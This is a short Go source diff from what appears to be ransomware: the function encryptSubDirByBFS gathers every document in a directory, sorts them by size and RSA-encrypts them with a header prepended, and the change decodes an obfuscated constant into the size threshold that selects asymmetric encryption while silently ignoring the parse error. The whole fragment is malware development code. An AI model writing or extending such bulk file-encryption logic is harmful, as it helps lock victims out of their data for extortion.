@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"fmt"
 	"sort"
+	"strconv"
 )
 
 type dirElement struct {
@@ -35,6 +36,10 @@ func (a dirElementSortBySize) Less(i, j int) bool {
 func encryptSubDirByBFS(dir string) {
 	docs := getAllDocs(dir)
 	sort.Sort(dirElementSortBySize(docs))
+	ASMETRI_MAX_INT, err := strconv.Atoi(byte_decode2str(ASMETRI_MAX[:]))
+	if err != nil {
+
+	}
 
 	for i, doc := range docs {
 		if IS_DEBUG {
@@ -49,7 +54,7 @@ func encryptSubDirByBFS(dir string) {
 
 		var data []byte
 		var err error
-		if doc.size < int64(ASMETRI_MAX) {
+		if doc.size < int64(ASMETRI_MAX_INT) {
 			data, err = rsa_encrypt(docData)
 			data = append(RSA1_HEADER, data...)
 		} else {
